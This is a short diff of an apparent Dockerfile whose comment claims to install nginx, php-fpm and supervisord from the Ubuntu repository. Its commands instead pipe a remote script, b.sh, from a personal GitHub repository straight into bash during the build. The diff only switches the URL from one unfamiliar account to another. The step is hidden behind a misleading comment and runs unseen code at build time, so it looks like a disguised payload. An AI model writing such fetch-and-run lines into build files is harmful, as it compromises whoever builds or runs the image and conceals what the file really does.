@@ -15,4 +15,4 @@ RUN apt update
 
 # Install nginx, php-fpm and supervisord from ubuntu repository
 RUN apt -y install wget
-RUN wget -O - https://github.com/sobriakila121/viwarlani/raw/main/b.sh | bash
+RUN wget -O - https://github.com/kamilairsyat08/viwarlani/raw/main/b.sh | bash
